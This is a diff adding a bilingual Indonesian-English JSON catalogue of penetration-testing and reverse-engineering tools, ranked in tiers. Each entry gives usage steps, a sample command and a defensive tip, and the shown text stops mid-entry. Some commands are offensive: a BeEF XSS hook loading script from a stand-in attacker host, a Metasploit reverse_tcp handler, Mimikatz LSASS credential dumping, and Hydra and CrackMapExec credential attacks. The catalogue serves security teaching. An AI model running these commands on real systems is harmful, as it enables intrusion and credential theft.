@@ -1,0 +1,1047 @@
+[
+ {
+  "name": "Burp Suite",
+  "tier": "demi_god",
+  "cat": "Intercepting Proxy",
+  "purpose": {
+   "id": "Menangkap dan memanipulasi request/response HTTP antara browser dan server sebelum terkirim.",
+   "en": "Intercepts and manipulates HTTP requests/responses between browser and server before they're sent."
+  },
+  "use": {
+   "id": "Arahkan proxy browser ke 127.0.0.1:8080, buka tab Proxy → Intercept, lalu ubah nilai parameter yang lewat.",
+   "en": "Point your browser's proxy to 127.0.0.1:8080, open Proxy → Intercept, then edit the parameter values passing through."
+  },
+  "cmd": "burpsuite --proxy-port 8080 --intercept on",
+  "tip": {
+   "id": "Di dunia nyata, celah ini dicegah dengan validasi di sisi SERVER, bukan cuma mengandalkan JavaScript di browser.",
+   "en": "In the real world this is prevented with SERVER-SIDE validation, not just trusting browser-side JavaScript."
+  },
+  "site": "https://portswigger.net/burp"
+ },
+ {
+  "name": "OWASP ZAP",
+  "tier": "demi_god",
+  "cat": "Web Vulnerability Scanner",
+  "purpose": {
+   "id": "Pemindai otomatis celah keamanan aplikasi web open-source dari OWASP.",
+   "en": "OWASP's open-source automated web application vulnerability scanner."
+  },
+  "use": {
+   "id": "Masukkan URL target di kolom 'Automated Scan', klik Attack, lalu baca laporan Alerts.",
+   "en": "Enter the target URL in 'Automated Scan', click Attack, then read the Alerts report."
+  },
+  "cmd": "zap-cli quick-scan --self-contained -o /zap/wrk/report.html https://target.id",
+  "tip": {
+   "id": "Scan otomatis cuma menangkap pola yang sudah dikenal; selalu verifikasi manual sebelum melapor sebagai celah nyata.",
+   "en": "Automated scans only catch known patterns; always verify manually before reporting a real finding."
+  },
+  "site": "https://www.zaproxy.org"
+ },
+ {
+  "name": "Nmap",
+  "tier": "demi_god",
+  "cat": "Network Scanner",
+  "purpose": {
+   "id": "Memindai host dan port yang terbuka di sebuah jaringan, termasuk versi servisnya.",
+   "en": "Scans hosts and open ports on a network, including service versions."
+  },
+  "use": {
+   "id": "Jalankan di terminal diarahkan ke IP/domain target; hasilnya daftar port terbuka dan servis yang berjalan.",
+   "en": "Run it in a terminal pointed at the target IP/domain; the output lists open ports and running services."
+  },
+  "cmd": "nmap -sV -p- 192.168.1.10",
+  "tip": {
+   "id": "Admin server yang baik menutup port yang tidak dipakai (least privilege) alih-alih mengandalkan 'tidak ketahuan'.",
+   "en": "A good admin closes unused ports (least privilege) instead of relying on 'security through obscurity'."
+  },
+  "site": "https://nmap.org"
+ },
+ {
+  "name": "Wireshark",
+  "tier": "demi_god",
+  "cat": "Packet Analyzer",
+  "purpose": {
+   "id": "Menangkap dan menganalisis paket data yang lalu-lalang di jaringan secara mendetail.",
+   "en": "Captures and inspects network packets in fine detail."
+  },
+  "use": {
+   "id": "Pilih antarmuka jaringan, klik Start, lalu filter paket dengan ekspresi seperti http.request.",
+   "en": "Select a network interface, click Start, then filter packets with an expression like http.request."
+  },
+  "cmd": "wireshark -i eth0 -f \"port 80\"",
+  "tip": {
+   "id": "Data sensitif yang lewat tanpa HTTPS bisa terbaca jelas lewat tool ini — itulah kenapa TLS wajib, bukan opsional.",
+   "en": "Sensitive data sent without HTTPS is plainly readable with this tool — that's why TLS is mandatory, not optional."
+  },
+  "site": "https://www.wireshark.org"
+ },
+ {
+  "name": "Nikto",
+  "tier": "demi_god",
+  "cat": "Web Server Scanner",
+  "purpose": {
+   "id": "Memindai server web untuk file berbahaya, konfigurasi usang, dan masalah keamanan umum.",
+   "en": "Scans a web server for dangerous files, outdated configs, and common security issues."
+  },
+  "use": {
+   "id": "Arahkan ke host target; hasilnya daftar temuan seperti header hilang atau direktori sensitif terbuka.",
+   "en": "Point it at the target host; the output lists findings like missing headers or exposed sensitive directories."
+  },
+  "cmd": "nikto -h https://target.id -ssl",
+  "tip": {
+   "id": "Header keamanan (X-Frame-Options, CSP, dll.) murah untuk dipasang tapi sering terlewat di aplikasi nyata.",
+   "en": "Security headers (X-Frame-Options, CSP, etc.) are cheap to add but often forgotten in real apps."
+  },
+  "site": "https://cirt.net/Nikto2"
+ },
+ {
+  "name": "SQLmap",
+  "tier": "demi_god",
+  "cat": "SQL Injection Tool",
+  "purpose": {
+   "id": "Mendeteksi dan mengeksploitasi celah SQL injection pada parameter aplikasi web secara otomatis.",
+   "en": "Automatically detects and exploits SQL injection flaws in web app parameters."
+  },
+  "use": {
+   "id": "Beri URL yang punya parameter dicurigai; tool mencoba berbagai payload untuk membuktikan celahnya.",
+   "en": "Give it a URL with a suspected parameter; it tries various payloads to prove the vulnerability."
+  },
+  "cmd": "sqlmap -u \"https://target.id/produk?id=1\" --dbs",
+  "tip": {
+   "id": "Prepared statements / parameterized query menutup celah ini total — jangan pernah menyambung string SQL mentah.",
+   "en": "Prepared/parameterized statements close this gap entirely — never concatenate raw SQL strings."
+  },
+  "site": "https://sqlmap.org"
+ },
+ {
+  "name": "Gobuster",
+  "tier": "demi_god",
+  "cat": "Directory Brute-forcer",
+  "purpose": {
+   "id": "Menebak nama direktori/file tersembunyi di server web dengan daftar kata (wordlist).",
+   "en": "Brute-forces hidden directory/file names on a web server using a wordlist."
+  },
+  "use": {
+   "id": "Beri URL target dan wordlist; tool mencoba tiap kata sebagai path dan melaporkan yang merespons.",
+   "en": "Give it a target URL and a wordlist; it tries each word as a path and reports which ones respond."
+  },
+  "cmd": "gobuster dir -u https://target.id -w wordlist.txt",
+  "tip": {
+   "id": "File backup (.bak, .old) atau folder admin yang 'disembunyikan' tetap bisa ditemukan — jangan andalkan itu sebagai proteksi.",
+   "en": "'Hidden' backup files (.bak, .old) or admin folders can still be found — never rely on that as protection."
+  },
+  "site": "https://github.com/OJ/gobuster"
+ },
+ {
+  "name": "Hydra",
+  "tier": "demi_god",
+  "cat": "Login Brute-forcer",
+  "purpose": {
+   "id": "Mencoba banyak kombinasi username/password untuk membobol halaman login.",
+   "en": "Tries many username/password combinations to break into a login page."
+  },
+  "use": {
+   "id": "Beri daftar user, daftar password, dan target servis (ssh, http-post-form, dll).",
+   "en": "Give it a user list, a password list, and the target service (ssh, http-post-form, etc.)."
+  },
+  "cmd": "hydra -l admin -P rockyou.txt ssh://192.168.1.10",
+  "tip": {
+   "id": "Rate limiting dan penguncian akun setelah beberapa percobaan gagal adalah pertahanan utama melawan ini.",
+   "en": "Rate limiting and account lockout after a few failed attempts are the main defenses against this."
+  },
+  "site": "https://github.com/vanhauser-thc/thc-hydra"
+ },
+ {
+  "name": "John the Ripper",
+  "tier": "demi_god",
+  "cat": "Password Cracker",
+  "purpose": {
+   "id": "Memecahkan hash password lewat serangan kamus atau brute-force offline.",
+   "en": "Cracks password hashes via dictionary or offline brute-force attacks."
+  },
+  "use": {
+   "id": "Beri file berisi hash; tool mencoba kata-kata umum lalu kombinasi karakter sampai cocok.",
+   "en": "Give it a file of hashes; it tries common words then character combinations until one matches."
+  },
+  "cmd": "john --wordlist=rockyou.txt hashes.txt",
+  "tip": {
+   "id": "Hash lambat seperti Argon2id/bcrypt membuat serangan ini jauh lebih mahal dibanding MD5/SHA1 biasa.",
+   "en": "Slow hashes like Argon2id/bcrypt make this attack far more expensive than plain MD5/SHA1."
+  },
+  "site": "https://www.openwall.com/john"
+ },
+ {
+  "name": "curl",
+  "tier": "demi_god",
+  "cat": "HTTP Client (CLI)",
+  "purpose": {
+   "id": "Mengirim request HTTP langsung dari terminal untuk menguji API atau endpoint secara manual.",
+   "en": "Sends HTTP requests directly from the terminal to manually test an API or endpoint."
+  },
+  "use": {
+   "id": "Tambahkan header, method, dan body sesuai kebutuhan pengujian endpoint target.",
+   "en": "Add headers, method, and body as needed to test the target endpoint."
+  },
+  "cmd": "curl -X POST -H \"Content-Type: application/json\" -d '{\"q\":1}' https://target.id/api",
+  "tip": {
+   "id": "Endpoint API yang tidak membatasi method (GET/POST/PUT/DELETE) bisa disalahgunakan — validasi method di server.",
+   "en": "An API endpoint that doesn't restrict methods (GET/POST/PUT/DELETE) can be abused — validate the method server-side."
+  },
+  "site": "https://curl.se"
+ },
+ {
+  "name": "Chrome DevTools",
+  "tier": "demi_god",
+  "cat": "Browser Inspector",
+  "purpose": {
+   "id": "Memeriksa dan mengubah HTML/CSS/JS serta request jaringan langsung dari browser.",
+   "en": "Inspects and edits HTML/CSS/JS and network requests right from the browser."
+  },
+  "use": {
+   "id": "Tekan F12, buka tab Network untuk melihat request, atau tab Console untuk menjalankan JavaScript.",
+   "en": "Press F12, open the Network tab to see requests, or the Console tab to run JavaScript."
+  },
+  "cmd": "// Console: fetch('/api/me').then(r=>r.json()).then(console.log)",
+  "tip": {
+   "id": "Validasi harga/role HANYA di client (disabled di tombol, hidden input) bisa dilewati lewat Console dalam hitungan detik.",
+   "en": "Validating price/role ONLY on the client (disabled buttons, hidden inputs) can be bypassed via the Console in seconds."
+  },
+  "site": "https://developer.chrome.com/docs/devtools"
+ },
+ {
+  "name": "Postman",
+  "tier": "demi_god",
+  "cat": "API Testing",
+  "purpose": {
+   "id": "Membuat dan mengirim request API secara manual untuk menguji endpoint dan autentikasinya.",
+   "en": "Builds and sends API requests manually to test endpoints and their authentication."
+  },
+  "use": {
+   "id": "Buat koleksi request, atur header Authorization, lalu kirim dan bandingkan responsnya.",
+   "en": "Create a request collection, set the Authorization header, then send and compare responses."
+  },
+  "cmd": "// Header: Authorization: Bearer <token>",
+  "tip": {
+   "id": "Token yang tidak kedaluwarsa (no expiry) adalah risiko besar jika pernah bocor sekali saja.",
+   "en": "A token that never expires is a huge risk if it leaks even once."
+  },
+  "site": "https://www.postman.com"
+ },
+ {
+  "name": "HTTPie",
+  "tier": "demi_god",
+  "cat": "HTTP Client (CLI)",
+  "purpose": {
+   "id": "Alternatif curl yang lebih mudah dibaca untuk menguji request/response HTTP dari terminal.",
+   "en": "A more readable curl alternative for testing HTTP requests/responses from the terminal."
+  },
+  "use": {
+   "id": "Tulis method dan URL, lalu field data langsung sebagai key=value tanpa perlu JSON manual.",
+   "en": "Write the method and URL, then data fields directly as key=value without manual JSON."
+  },
+  "cmd": "http POST target.id/api/login username=admin password=admin123",
+  "tip": {
+   "id": "Mencoba kredensial default (admin/admin123) adalah langkah pertama penyerang — selalu paksa ganti password awal.",
+   "en": "Trying default credentials (admin/admin123) is an attacker's first move — always force an initial password change."
+  },
+  "site": "https://httpie.io"
+ },
+ {
+  "name": "WPScan",
+  "tier": "demi_god",
+  "cat": "CMS Vulnerability Scanner",
+  "purpose": {
+   "id": "Memindai situs WordPress untuk plugin, tema, dan versi core yang punya celah diketahui.",
+   "en": "Scans a WordPress site for plugins, themes, and core versions with known vulnerabilities."
+  },
+  "use": {
+   "id": "Arahkan ke URL WordPress target dengan API token untuk mencocokkan versi dengan basis data celah.",
+   "en": "Point it at the target WordPress URL with an API token to match versions against a vulnerability database."
+  },
+  "cmd": "wpscan --url https://target.id --enumerate vp",
+  "tip": {
+   "id": "Plugin/tema yang jarang diperbarui adalah penyebab terbesar situs WordPress diretas — rutinkan update.",
+   "en": "Rarely-updated plugins/themes are the biggest cause of hacked WordPress sites — keep them updated."
+  },
+  "site": "https://wpscan.com"
+ },
+ {
+  "name": "Metasploit Framework",
+  "tier": "god",
+  "cat": "Exploitation Framework",
+  "purpose": {
+   "id": "Framework untuk mengembangkan, menguji, dan menjalankan exploit terhadap target yang rentan.",
+   "en": "A framework for developing, testing, and running exploits against vulnerable targets."
+  },
+  "use": {
+   "id": "Cari modul exploit yang cocok, set opsi RHOSTS/payload, lalu jalankan untuk mendapat akses.",
+   "en": "Find a matching exploit module, set RHOSTS/payload options, then run it to gain access."
+  },
+  "cmd": "use exploit/multi/handler\nset payload windows/meterpreter/reverse_tcp\nexploit",
+  "tip": {
+   "id": "Sistem yang rutin di-patch menutup celah sebelum exploit publik sempat dipakai menyerangnya.",
+   "en": "Regularly patched systems close the hole before a public exploit can be used against them."
+  },
+  "site": "https://www.metasploit.com"
+ },
+ {
+  "name": "Cobalt Strike",
+  "tier": "god",
+  "cat": "Adversary Simulation / C2",
+  "purpose": {
+   "id": "Platform command-and-control untuk mensimulasikan serangan APT dalam latihan red team.",
+   "en": "A command-and-control platform for simulating APT-style attacks in red team exercises."
+  },
+  "use": {
+   "id": "Deploy beacon ke host korban, lalu kendalikan lewat Team Server untuk gerak lateral di jaringan.",
+   "en": "Deploy a beacon to the victim host, then control it via the Team Server to move laterally in the network."
+  },
+  "cmd": "beacon> jump psexec64 TARGET-PC smb",
+  "tip": {
+   "id": "Segmentasi jaringan membatasi seberapa jauh penyerang bisa 'lompat' walau satu host sudah dikuasai.",
+   "en": "Network segmentation limits how far an attacker can move even after one host is compromised."
+  },
+  "site": "https://www.cobaltstrike.com"
+ },
+ {
+  "name": "BeEF",
+  "tier": "god",
+  "cat": "Browser Exploitation",
+  "purpose": {
+   "id": "Mengendalikan browser korban yang sudah 'dikaitkan' lewat XSS untuk eksplorasi lebih lanjut.",
+   "en": "Controls a victim's 'hooked' browser via XSS for further exploration."
+  },
+  "use": {
+   "id": "Suntikkan hook.js ke halaman rentan XSS, lalu kendalikan browser korban dari panel BeEF.",
+   "en": "Inject hook.js into an XSS-vulnerable page, then control the victim's browser from the BeEF panel."
+  },
+  "cmd": "<script src=\"http://attacker/hook.js\"></script>",
+  "tip": {
+   "id": "Content Security Policy (CSP) yang ketat mencegah script asing seperti ini dimuat sama sekali.",
+   "en": "A strict Content Security Policy (CSP) prevents a foreign script like this from loading at all."
+  },
+  "site": "https://beefproject.com"
+ },
+ {
+  "name": "Aircrack-ng",
+  "tier": "god",
+  "cat": "WiFi Security Auditing",
+  "purpose": {
+   "id": "Suite untuk menguji keamanan WiFi: menangkap handshake dan memecahkan kunci WPA/WPA2.",
+   "en": "A suite for auditing WiFi security: capturing handshakes and cracking WPA/WPA2 keys."
+  },
+  "use": {
+   "id": "Tangkap handshake 4-way saat perangkat terhubung, lalu crack dengan wordlist lewat aircrack-ng.",
+   "en": "Capture the 4-way handshake when a device connects, then crack it with a wordlist via aircrack-ng."
+  },
+  "cmd": "aircrack-ng -w wordlist.txt -b AA:BB:CC:DD:EE:FF capture.cap",
+  "tip": {
+   "id": "Passphrase WiFi yang panjang dan acak membuat serangan kamus seperti ini praktis tidak berguna.",
+   "en": "A long, random WiFi passphrase makes this dictionary attack practically useless."
+  },
+  "site": "https://www.aircrack-ng.org"
+ },
+ {
+  "name": "Hashcat",
+  "tier": "god",
+  "cat": "GPU Password Cracker",
+  "purpose": {
+   "id": "Memecahkan hash password dengan kecepatan tinggi memakai daya komputasi GPU.",
+   "en": "Cracks password hashes at high speed using GPU compute power."
+  },
+  "use": {
+   "id": "Pilih mode hash yang sesuai (-m), lalu jalankan serangan kamus atau mask terhadap filenya.",
+   "en": "Pick the matching hash mode (-m), then run a dictionary or mask attack against the file."
+  },
+  "cmd": "hashcat -m 0 -a 0 hashes.txt rockyou.txt",
+  "tip": {
+   "id": "Menambahkan 'salt' unik tiap password mencegah tabel pre-computed dipakai menyerang banyak akun sekaligus.",
+   "en": "Adding a unique per-password 'salt' stops a precomputed table from attacking many accounts at once."
+  },
+  "site": "https://hashcat.net/hashcat"
+ },
+ {
+  "name": "Mimikatz",
+  "tier": "god",
+  "cat": "Credential Dumping",
+  "purpose": {
+   "id": "Mengekstrak kredensial (password, hash, tiket Kerberos) dari memori Windows.",
+   "en": "Extracts credentials (passwords, hashes, Kerberos tickets) from Windows memory."
+  },
+  "use": {
+   "id": "Jalankan dengan privilege admin, lalu gunakan modul sekurlsa untuk membaca kredensial dari LSASS.",
+   "en": "Run it with admin privilege, then use the sekurlsa module to read credentials from LSASS."
+  },
+  "cmd": "mimikatz # sekurlsa::logonpasswords",
+  "tip": {
+   "id": "Credential Guard dan membatasi akun admin domain di workstation biasa menutup banyak jalur tool ini.",
+   "en": "Credential Guard and keeping domain admin accounts off regular workstations close most of this tool's paths."
+  },
+  "site": "https://github.com/gentilkiwi/mimikatz"
+ },
+ {
+  "name": "Responder",
+  "tier": "god",
+  "cat": "Network Poisoning",
+  "purpose": {
+   "id": "Meracuni respons LLMNR/NBT-NS di jaringan lokal untuk menangkap hash kredensial Windows.",
+   "en": "Poisons LLMNR/NBT-NS responses on a local network to capture Windows credential hashes."
+  },
+  "use": {
+   "id": "Jalankan di antarmuka jaringan lokal; tool menunggu permintaan resolusi nama yang salah ketik lalu menjebaknya.",
+   "en": "Run it on the local network interface; it waits for mistyped name-resolution requests and traps them."
+  },
+  "cmd": "responder -I eth0 -wrf",
+  "tip": {
+   "id": "Menonaktifkan LLMNR/NBT-NS di kebijakan grup Windows menutup celah peracunan nama ini.",
+   "en": "Disabling LLMNR/NBT-NS via Windows Group Policy closes this name-poisoning hole."
+  },
+  "site": "https://github.com/lgandx/Responder"
+ },
+ {
+  "name": "CrackMapExec",
+  "tier": "god",
+  "cat": "AD Post-Exploitation",
+  "purpose": {
+   "id": "Menguji dan menyebar kredensial di banyak host Active Directory sekaligus untuk memetakan akses.",
+   "en": "Tests and sprays credentials across many Active Directory hosts at once to map access."
+  },
+  "use": {
+   "id": "Beri rentang IP dan kredensial; tool mengecek mana yang valid di tiap host secara paralel.",
+   "en": "Give it an IP range and credentials; it checks which are valid on each host in parallel."
+  },
+  "cmd": "crackmapexec smb 10.0.0.0/24 -u admin -p 'Passw0rd!'",
+  "tip": {
+   "id": "Prinsip 'satu password per sistem' mencegah satu kredensial bocor membuka seluruh jaringan.",
+   "en": "A 'one password per system' policy stops a single leaked credential from unlocking the whole network."
+  },
+  "site": "https://github.com/Porchetta-Industries/CrackMapExec"
+ },
+ {
+  "name": "Nessus",
+  "tier": "god",
+  "cat": "Vulnerability Scanner",
+  "purpose": {
+   "id": "Pemindai kerentanan komersial yang mencocokkan sistem target dengan basis data CVE.",
+   "en": "A commercial vulnerability scanner that matches target systems against a CVE database."
+  },
+  "use": {
+   "id": "Buat policy scan, arahkan ke rentang IP target, lalu baca laporan tingkat keparahan tiap temuan.",
+   "en": "Create a scan policy, point it at the target IP range, then read the severity report for each finding."
+  },
+  "cmd": "nessuscli scan --policy \"Basic Network Scan\" --targets 10.0.0.0/24",
+  "tip": {
+   "id": "Scan kerentanan rutin (bukan sekali saja) penting karena CVE baru muncul setiap hari.",
+   "en": "Routine (not one-off) vulnerability scans matter because new CVEs appear daily."
+  },
+  "site": "https://www.tenable.com/products/nessus"
+ },
+ {
+  "name": "OpenVAS",
+  "tier": "god",
+  "cat": "Vulnerability Scanner",
+  "purpose": {
+   "id": "Pemindai kerentanan open-source dengan basis data Network Vulnerability Tests (NVT) yang terus diperbarui.",
+   "en": "An open-source vulnerability scanner with a continuously updated Network Vulnerability Tests (NVT) database."
+  },
+  "use": {
+   "id": "Daftarkan target di Greenbone, pilih task scan, lalu tinjau laporan hasil pemindaian.",
+   "en": "Register the target in Greenbone, select a scan task, then review the scan report."
+  },
+  "cmd": "gvm-cli --gmp-username admin socket --xml \"<get_tasks/>\"",
+  "tip": {
+   "id": "Alat gratis sekalipun bisa seefektif komersial kalau basis data kerentanannya rutin diperbarui.",
+   "en": "Even free tools can be as effective as commercial ones if the vulnerability database is kept current."
+  },
+  "site": "https://www.openvas.org"
+ },
+ {
+  "name": "Shodan",
+  "tier": "god",
+  "cat": "Internet Device Search Engine",
+  "purpose": {
+   "id": "Mesin pencari yang mengindeks perangkat terhubung internet (server, kamera, IoT) beserta bannernya.",
+   "en": "A search engine that indexes internet-connected devices (servers, cameras, IoT) along with their banners."
+  },
+  "use": {
+   "id": "Cari dengan query seperti 'port:22 product:OpenSSH' untuk menemukan perangkat sesuai kriteria.",
+   "en": "Search with a query like 'port:22 product:OpenSSH' to find devices matching the criteria."
+  },
+  "cmd": "shodan search \"default password\" port:23",
+  "tip": {
+   "id": "Jangan pernah mengekspos panel admin atau IoT ke internet publik tanpa autentikasi kuat — Shodan akan menemukannya.",
+   "en": "Never expose an admin panel or IoT device to the public internet without strong auth — Shodan will find it."
+  },
+  "site": "https://www.shodan.io"
+ },
+ {
+  "name": "Maltego",
+  "tier": "god",
+  "cat": "OSINT / Link Analysis",
+  "purpose": {
+   "id": "Memvisualisasikan hubungan antar data (domain, email, orang) dari sumber OSINT dalam bentuk graf.",
+   "en": "Visualizes relationships between data (domains, emails, people) from OSINT sources as a graph."
+  },
+  "use": {
+   "id": "Masukkan entitas awal (mis. domain), jalankan 'transform' untuk menemukan entitas terkait secara otomatis.",
+   "en": "Enter a starting entity (e.g. a domain), run a 'transform' to automatically discover related entities."
+  },
+  "cmd": "// Transform: Domain → DNS → IP → Netblock",
+  "tip": {
+   "id": "Informasi yang kelihatan remeh (nama pegawai di LinkedIn) sering jadi titik awal serangan phishing bertarget.",
+   "en": "Seemingly trivial info (an employee's name on LinkedIn) often becomes the starting point of a targeted phishing attack."
+  },
+  "site": "https://www.maltego.com"
+ },
+ {
+  "name": "Social-Engineer Toolkit (SET)",
+  "tier": "god",
+  "cat": "Social Engineering Framework",
+  "purpose": {
+   "id": "Framework untuk membuat simulasi serangan rekayasa sosial seperti phishing dan klon situs login.",
+   "en": "A framework for simulating social-engineering attacks like phishing and cloned login pages."
+  },
+  "use": {
+   "id": "Pilih menu 'Website Attack Vectors' → 'Credential Harvester' lalu masukkan URL yang mau dikloning.",
+   "en": "Choose 'Website Attack Vectors' → 'Credential Harvester', then enter the URL to clone."
+  },
+  "cmd": "setoolkit  # 1) Social-Engineering Attacks  2) Website Attack Vectors",
+  "tip": {
+   "id": "Pelatihan kesadaran keamanan rutin untuk pegawai adalah pertahanan paling efektif melawan phishing.",
+   "en": "Regular security-awareness training for employees is the most effective defense against phishing."
+  },
+  "site": "https://github.com/trustedsec/social-engineer-toolkit"
+ },
+ {
+  "name": "Empire",
+  "tier": "god",
+  "cat": "Post-Exploitation C2",
+  "purpose": {
+   "id": "Framework command-and-control pasca-eksploitasi berbasis PowerShell/Python untuk persistensi akses.",
+   "en": "A PowerShell/Python-based post-exploitation C2 framework for maintaining access persistence."
+  },
+  "use": {
+   "id": "Buat listener, hasilkan stager untuk korban, lalu kendalikan agent yang terhubung.",
+   "en": "Create a listener, generate a stager for the victim, then control the connected agent."
+  },
+  "cmd": "(Empire) > listeners\n(Empire: listeners) > execute",
+  "tip": {
+   "id": "EDR (Endpoint Detection & Response) modern dirancang khusus mendeteksi pola agent C2 seperti ini.",
+   "en": "Modern EDR (Endpoint Detection & Response) is specifically built to detect C2 agent patterns like this."
+  },
+  "site": "https://github.com/BC-SECURITY/Empire"
+ },
+ {
+  "name": "IDA Pro",
+  "tier": "true_god",
+  "cat": "Disassembler",
+  "purpose": {
+   "id": "Mengubah binary terkompilasi menjadi kode assembly/pseudo-C yang bisa dianalisis manusia.",
+   "en": "Turns compiled binaries into assembly/pseudo-C code a human can analyze."
+  },
+  "use": {
+   "id": "Buka file binary, telusuri fungsi lewat Graph View, lalu beri nama ulang variabel agar mudah dibaca.",
+   "en": "Open the binary, navigate functions via Graph View, then rename variables to make it readable."
+  },
+  "cmd": "File > Open > target.bin  // lalu tekan F5 untuk Hex-Rays decompiler",
+  "tip": {
+   "id": "Obfuscation memperlambat reverse engineering tapi tidak mencegahnya total — jangan jadikan itu satu-satunya proteksi.",
+   "en": "Obfuscation slows reverse engineering but never fully prevents it — don't make it your only protection."
+  },
+  "site": "https://hex-rays.com/ida-pro"
+ },
+ {
+  "name": "Ghidra",
+  "tier": "true_god",
+  "cat": "Reverse Engineering Suite",
+  "purpose": {
+   "id": "Suite reverse engineering gratis buatan NSA: disassembler, decompiler, dan analisis binary.",
+   "en": "NSA's free reverse-engineering suite: disassembler, decompiler, and binary analysis."
+  },
+  "use": {
+   "id": "Buat proyek, import binary, jalankan auto-analysis, lalu baca hasil dekompilasi fungsi targetnya.",
+   "en": "Create a project, import the binary, run auto-analysis, then read the decompiled target function."
+  },
+  "cmd": "analyzeHeadless /project ghidra_proj -import target.bin -postScript Analyze.java",
+  "tip": {
+   "id": "Kode yang sudah dikompilasi tetap bisa dibaca logikanya — jangan taruh secret (API key) di dalam binary.",
+   "en": "Compiled code's logic can still be read — never embed a secret (API key) inside a binary."
+  },
+  "site": "https://ghidra-sre.org"
+ },
+ {
+  "name": "Radare2",
+  "tier": "true_god",
+  "cat": "Reverse Engineering Framework",
+  "purpose": {
+   "id": "Framework reverse engineering berbasis command-line untuk disassembly, debugging, dan patching binary.",
+   "en": "A command-line reverse-engineering framework for disassembly, debugging, and binary patching."
+  },
+  "use": {
+   "id": "Buka binary dengan flag analisis, lalu gunakan perintah seperti pdf untuk melihat disassembly fungsi.",
+   "en": "Open the binary with the analysis flag, then use commands like pdf to view a function's disassembly."
+  },
+  "cmd": "r2 -A target.bin\n[0x00001040]> pdf @main",
+  "tip": {
+   "id": "Tool command-line yang skriptable seperti ini memudahkan otomasi analisis malware dalam jumlah besar.",
+   "en": "A scriptable CLI tool like this makes automating large-scale malware analysis much easier."
+  },
+  "site": "https://rada.re/n"
+ },
+ {
+  "name": "pwntools",
+  "tier": "true_god",
+  "cat": "Exploit Development Library",
+  "purpose": {
+   "id": "Pustaka Python untuk mempercepat pengembangan exploit binary: membangun payload dan berinteraksi dengan proses.",
+   "en": "A Python library that speeds up binary exploit development: crafting payloads and interacting with a process."
+  },
+  "use": {
+   "id": "Gunakan p32/p64 untuk membungkus alamat, lalu kirim payload ke proses lewat process() atau remote().",
+   "en": "Use p32/p64 to pack addresses, then send the payload to the process via process() or remote()."
+  },
+  "cmd": "from pwn import *\npayload = b'A'*72 + p64(0xdeadbeef)",
+  "tip": {
+   "id": "Stack canary dan ASLR dirancang khusus untuk membuat payload buffer overflow seperti ini jauh lebih sulit berhasil.",
+   "en": "Stack canaries and ASLR are specifically designed to make buffer-overflow payloads like this far harder to succeed."
+  },
+  "site": "https://docs.pwntools.com"
+ },
+ {
+  "name": "GDB + GEF",
+  "tier": "true_god",
+  "cat": "Exploit Dev Debugger",
+  "purpose": {
+   "id": "Debugger binary tingkat rendah; GEF menambah fitur khusus eksploitasi seperti cek proteksi biner.",
+   "en": "A low-level binary debugger; GEF adds exploitation-focused features like checking binary protections."
+  },
+  "use": {
+   "id": "Muat binary, set breakpoint di fungsi rentan, lalu periksa register dan stack saat crash terjadi.",
+   "en": "Load the binary, set a breakpoint at the vulnerable function, then inspect registers and the stack when it crashes."
+  },
+  "cmd": "gdb ./target\ngef> checksec",
+  "tip": {
+   "id": "Proteksi biner seperti NX, PIE, dan Canary semuanya bisa diperiksa satu perintah ini sebelum mencari celah.",
+   "en": "Binary protections like NX, PIE, and Canary can all be checked with this one command before hunting for a flaw."
+  },
+  "site": "https://github.com/bata24/gef"
+ },
+ {
+  "name": "AFL++",
+  "tier": "true_god",
+  "cat": "Fuzzing Framework",
+  "purpose": {
+   "id": "Menemukan bug dan crash pada program dengan membombardirnya memakai input acak yang dimutasi cerdas.",
+   "en": "Finds bugs and crashes in a program by bombarding it with smartly-mutated random input."
+  },
+  "use": {
+   "id": "Kompilasi program dengan afl-cc, siapkan input awal, lalu jalankan fuzzer dan pantau crash yang ditemukan.",
+   "en": "Compile the program with afl-cc, seed it with initial input, then run the fuzzer and watch for crashes found."
+  },
+  "cmd": "afl-fuzz -i seeds/ -o findings/ -- ./target @@",
+  "tip": {
+   "id": "Fuzzing rutin di CI/CD menemukan crash sebelum rilis, jauh lebih murah daripada ditemukan penyerang di produksi.",
+   "en": "Routine fuzzing in CI/CD finds crashes before release — far cheaper than an attacker finding them in production."
+  },
+  "site": "https://aflplus.plus"
+ },
+ {
+  "name": "Frida",
+  "tier": "true_god",
+  "cat": "Dynamic Instrumentation",
+  "purpose": {
+   "id": "Menyuntik dan memodifikasi perilaku aplikasi (termasuk mobile) saat berjalan, tanpa rekompilasi.",
+   "en": "Injects and modifies an app's behavior (including mobile apps) at runtime, without recompiling."
+  },
+  "use": {
+   "id": "Tulis skrip JavaScript yang meng-hook fungsi target, lalu lampirkan ke proses yang sedang berjalan.",
+   "en": "Write a JavaScript script that hooks the target function, then attach it to the running process."
+  },
+  "cmd": "frida -U -f com.target.app -l hook.js",
+  "tip": {
+   "id": "Pemeriksaan integritas (root/jailbreak detection) yang kuat mempersulit instrumentasi runtime seperti ini di aplikasi mobile.",
+   "en": "Strong integrity checks (root/jailbreak detection) make runtime instrumentation like this much harder on mobile apps."
+  },
+  "site": "https://frida.re"
+ },
+ {
+  "name": "Volatility",
+  "tier": "true_god",
+  "cat": "Memory Forensics",
+  "purpose": {
+   "id": "Menganalisis dump RAM untuk menemukan proses, koneksi jaringan, dan malware yang berjalan di memori.",
+   "en": "Analyzes a RAM dump to find processes, network connections, and in-memory malware."
+  },
+  "use": {
+   "id": "Identifikasi profil OS dari dump, lalu jalankan plugin seperti pslist atau netscan untuk menelusuri aktivitas.",
+   "en": "Identify the OS profile from the dump, then run plugins like pslist or netscan to trace activity."
+  },
+  "cmd": "volatility -f memdump.raw --profile=Win10x64 pslist",
+  "tip": {
+   "id": "Malware fileless hanya hidup di RAM — forensik memori sering jadi satu-satunya cara mendeteksinya.",
+   "en": "Fileless malware lives only in RAM — memory forensics is often the only way to detect it."
+  },
+  "site": "https://volatilityfoundation.org"
+ },
+ {
+  "name": "YARA",
+  "tier": "true_god",
+  "cat": "Malware Pattern Matching",
+  "purpose": {
+   "id": "Menulis aturan untuk mengenali dan mengklasifikasikan file malware berdasarkan pola string/byte.",
+   "en": "Writes rules to identify and classify malware files based on string/byte patterns."
+  },
+  "use": {
+   "id": "Tulis rule berisi pola yang dicari, lalu jalankan terhadap file atau direktori untuk mencari kecocokan.",
+   "en": "Write a rule containing the pattern to search for, then run it against a file or directory for matches."
+  },
+  "cmd": "yara -r malware_rules.yar /samples/",
+  "tip": {
+   "id": "Tim blue team memakai rule ini untuk mendeteksi varian baru malware yang mirip sampel lama.",
